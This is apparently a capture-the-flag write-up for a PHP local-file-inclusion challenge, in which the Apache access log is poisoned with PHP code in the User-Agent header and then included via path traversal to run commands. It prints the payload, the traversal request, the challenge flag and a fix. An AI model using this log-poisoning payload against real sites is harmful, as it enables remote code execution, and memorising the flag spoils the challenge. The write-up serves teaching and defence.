# 02 · log-poison (medium)

The app includes the page named in `?page=`. The sink is `include()`, so the goal
is code execution, not just file reading. Wrappers (`php://filter`, `data://`,
`expect://`) are blocked by a WAF and uploads are disabled — but the Apache access
log is readable and records attacker-controlled input.

## Vulnerability
```php
include($_GET['page']);   // after a wrapper blacklist
```
`include()` executes any PHP found in the target file. The access log stores the
`User-Agent` header verbatim and is readable by `www-data`, so it can be turned
into a PHP file.

## Exploitation
1. Poison the log with a request whose User-Agent is PHP:
   ```
   User-Agent: <?php system('/usr/local/bin/ctf-shell ' . escapeshellarg($_GET['c'] ?? '')); ?>
   ```
2. Include the log and pass a command:
   ```
   GET /?page=../../../../../var/log/apache2/access.log&c=cat%20/flag.txt
   ```
   Including the log runs the poisoned line, which executes the command through
   `ctf-shell` (restricted to `cat`/`ls`).

## Flag
```
SecurinetsENIT{p01s0n_th3_l0g_1nclud3_th3_l0g_pr0f1t}
```

## Fix
Never `include()` user input — map a fixed allow-list of page names to files. Keep
logs out of any include path and non-readable by the web user.
